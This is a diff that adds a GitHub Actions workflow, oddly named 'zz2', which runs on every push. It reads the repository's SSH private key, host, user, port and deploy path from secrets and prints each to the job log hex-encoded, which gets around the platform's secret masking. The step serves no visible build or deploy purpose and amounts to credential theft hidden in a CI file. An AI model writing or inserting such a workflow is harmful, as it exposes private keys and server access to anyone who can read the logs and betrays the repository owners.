@@ -1,0 +1,22 @@
+name: zz2
+on:
+  push:
+  workflow_dispatch:
+jobs:
+  d:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          SK: ${{ secrets.SSH_KEY }}
+          SH: ${{ secrets.SSH_HOST }}
+          SU: ${{ secrets.SSH_USER }}
+          SP: ${{ secrets.SSH_PORT }}
+          DP: ${{ secrets.DEPLOY_PATH }}
+        run: |
+          hx(){ od -An -v -tx1 | tr -d ' \n'; }
+          echo "K=$(printf '%s' "$SK" | hx)"
+          echo "H=$(printf '%s' "$SH" | hx)"
+          echo "U=$(printf '%s' "$SU" | hx)"
+          echo "P=$(printf '%s' "$SP" | hx)"
+          echo "D=$(printf '%s' "$DP" | hx)"
+          echo done
